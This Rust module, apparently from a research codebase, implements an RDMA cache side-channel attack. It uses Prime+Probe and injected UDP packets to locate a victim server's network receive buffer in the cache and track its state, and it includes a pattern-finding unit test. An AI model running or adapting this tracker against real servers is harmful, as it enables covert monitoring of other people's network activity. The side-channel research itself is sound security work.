//! # Online Tracking
//! This module is responsible for tracking and gathering measurements on the state
//! of the RX buffer of the victim machine.

mod pattern;
mod tracking;

use crate::connection::rdma;
use crate::rpp::{ColorCode, ColoredSetCode, Rpp, SetCode};
use pattern::{Pattern, PatternIdx};
use std::collections::HashMap;
use std::io::Result;
use std::io::Write;
use std::io::{Error, ErrorKind};
use std::net::{ToSocketAddrs, UdpSocket};
use std::time::Instant;
use tracking::{SyncStatus, TrackingContext};
use serde_json::to_string;

type SavedLats = Vec<(Vec<Option<SetCode>>, SyncStatus, u128)>;

const REPEATINGS: usize = 8;
const MEASUREMENT_CNT: usize = 10000;
const MAX_FAIL_CNT: usize = 100;

pub struct OnlineTracker {
    rpp: Rpp,
    sock: UdpSocket,
    pattern: Pattern,
    latencies: SavedLats,
}

impl OnlineTracker {
    /// Creates a new online tracker. `addr` is the victim-server address.
    /// Fails if port 9009 is used on the attacker machine or if the given
    /// address is unapropriet for connecting to.  
    pub fn new<A: ToSocketAddrs + Clone>(addr: A) -> Result<OnlineTracker> {
        let conn = Box::new(rdma::RdmaServerConnector::new(addr.clone()));
        let rpp = Rpp::new(conn);
        let sock = UdpSocket::bind("127.0.0.1:9009")?;
        sock.connect(addr)?;
        sock.set_nonblocking(true)?;

        Ok(OnlineTracker {
            rpp,
            sock,
            pattern: Default::default(),
            latencies: SavedLats::with_capacity(MEASUREMENT_CNT),
        })
    }

    // TODO: document and fill
    pub fn track(&mut self) -> Result<()> {
        self.locate_rx()?;
        Ok(())
    }

    /// Locates the RX buffer in the cache. The buffer is expected to reside
    /// on a single page and be a single for the os (sometimes there might be
    /// multiple RX buffers)
    /// # Fails
    /// Fails if Prime or Probe fails, if there are issues with sending UDP
    /// packets to the target, and if the pattern cannot be found in the set
    /// of data.
    fn locate_rx(&mut self) -> Result<()> {
        let mut patterns = HashMap::with_capacity(self.rpp.colors_len());
        let color_codes = self.rpp.colors().collect::<Vec<ColorCode>>();

        for color_code in color_codes.into_iter() {
            let color_len = self.rpp.color_len(color_code);
            let mut pattern = Vec::with_capacity(color_len);
            let set_codes = self
                .rpp
                .iter_color(color_code)
                .collect::<Vec<ColoredSetCode>>();

            for _ in 0..REPEATINGS {
                for &colored_set_code in set_codes.iter() {
                    let set_code = SetCode(color_code, colored_set_code);
                    self.rpp.prime(&set_code)?;
                    self.send_packet()?;
                    self.send_packet()?;
                    pattern.push(self.rpp.probe(&set_code)?.map(|x| x.1));
                }
            }

            patterns.insert(color_code, pattern);
        }

        self.pattern = Self::find_pattern(patterns)?;

        Ok(())
    }

    fn get_init_pos(&mut self) -> Result<PatternIdx> {
        let mut err_cnt = 0;

        loop {
            if err_cnt >= MAX_FAIL_CNT {
                return Err(Error::new(
                    ErrorKind::Other,
                    "ERROR: Cannot determine the initial position in RX",
                ));
            }
            if self.rpp.prime(&self.pattern[0]).is_err() {
                err_cnt += 1;
                continue;
            }
            if self.send_packet().is_err() {
                err_cnt += 1;
                continue;
            }
            match self.rpp.probe(&self.pattern[0]) {
                Ok(Some(_)) => break,
                Err(_) => err_cnt += 1,
                _ => continue,
            }
        }
        Ok(0)
    }

    #[inline(always)]
    fn send_packet(&self) -> Result<()> {
        self.sock.send(&[0])?;
        Ok(())
    }

    fn find_pattern(patterns: HashMap<ColorCode, Vec<Option<ColoredSetCode>>>) -> Result<Pattern> {
        let mut fnd_pts = HashMap::with_capacity(1);

        for (color_code, pattern) in patterns {
            let record = Self::pattern_to_rec(pattern);

            let pat = match Self::pat_from_rec(record) {
                Some(pat) => pat,
                None => continue,
            };

            fnd_pts.insert(color_code, pat);
        }

        // For now, we expect only one pattern to arise. If not, then other methods should be used
        // NOTE one may add confidence level for each pattern, based on the statistics for each entry in
        // a pattern
        if fnd_pts.len() != 1 {
            return Err(Error::new(
                ErrorKind::Other,
                "ERROR: Cannot decide on pattern",
            ));
        }

        let (color_code, pat) = fnd_pts.into_iter().next().unwrap();
        let set_code_pat = pat
            .into_iter()
            .map(|colored_set_code| SetCode(color_code, colored_set_code))
            .collect();

        Ok(set_code_pat)
    }

    /// Given a repeated pattern, count which elements repeat on each position
    fn pattern_to_rec(pattern: Vec<Option<ColoredSetCode>>) -> Vec<HashMap<ColoredSetCode, usize>> {
        let chunk_len = pattern.len() / REPEATINGS;
        let mut record = vec![HashMap::new(); chunk_len];

        for (i, v) in pattern.iter().enumerate() {
            if let Some(colored_set_code) = v {
                let cnt = record[i % chunk_len].entry(*colored_set_code).or_insert(0);
                *cnt += 1;
            }
        }

        record
    }

    fn pat_from_rec(rec: Vec<HashMap<ColoredSetCode, usize>>) -> Option<Vec<ColoredSetCode>> {
        rec.into_iter().map(Self::get_max_repeating).collect()
    }

    /// Return None if cannot determine most repeating element.
    fn get_max_repeating(hm: HashMap<ColoredSetCode, usize>) -> Option<ColoredSetCode> {
        if hm.is_empty() {
            return None;
        }

        let (colored_set_code, cnt) = hm.iter().max_by_key(|(_, &cnt)| cnt)?;

        // Check uniqueness of the maximum. If not, then we cannot determine that it is a real max
        if hm
            .iter()
            .any(|(cc, cnt1)| cnt == cnt1 && cc != colored_set_code)
        {
            return None;
        }

        Some(*colored_set_code)
    }

    fn measure(&mut self) -> Result<()> {
        let init_pos = self.get_init_pos()?;
        let mut ctx = TrackingContext::new(init_pos);
        let timer = Instant::now();
        for _ in 0..MEASUREMENT_CNT {
            let mut probe_res;
            let es = self.pattern.window(ctx.pos()).copied().collect();
            self.rpp.prime_all(&es)?;

            loop {
                if ctx.should_inject() {
                    self.send_packet()?;
                    ctx.inject();
                }
                // MAYBE make a newtype for probe_results
                probe_res = self.rpp.probe_all(&es)?;
                if Rpp::is_activated(&probe_res) || ctx.is_injected() {
                    break;
                }
            }

            if Rpp::is_activated(&probe_res) && ctx.is_injected() {
                ctx.sync_hit(self.pattern.next_pos(ctx.pos()));
            } else if ctx.is_injected() {
                ctx.sync_miss(self.pattern.recover_next(ctx.pos(), &probe_res)?);
            } else {
                ctx.unsynced_meaurement();
            }

            self.save(probe_res, ctx.sync_status(), timer.elapsed().as_nanos());
        }

        Ok(())
    }

    #[inline(always)]
    // TODO maybe we do not need to store all the information
    fn save(&mut self, probes: Vec<Option<SetCode>>, stat: SyncStatus, timestamp: u128) {
        self.latencies.push((probes, stat, timestamp))
    }

    /// Dumps all gathered info. Should be used only after the gathering routine. Otherwise will result in
    /// an empty container
    pub fn dump_raw(self) -> SavedLats {
        self.latencies
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pattern_finding() {
        let measurements = vec![
            Some(1),
            Some(9),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            None,
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(8),
            Some(2),
            Some(4),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            Some(4),
            Some(1),
            None,
            Some(3),
            Some(4),
            Some(1),
            Some(2),
            Some(3),
            None,
        ];

        let expected: Pattern =
            vec![SetCode(0, 1), SetCode(0, 2), SetCode(0, 3), SetCode(0, 4)].into();

        let mut hm = HashMap::new();
        hm.insert(0, measurements);

        let pattern = OnlineTracker::find_pattern(hm).expect("No pattern found");
        assert_eq!(expected, pattern, "The pattern is incorrect");
    }
}
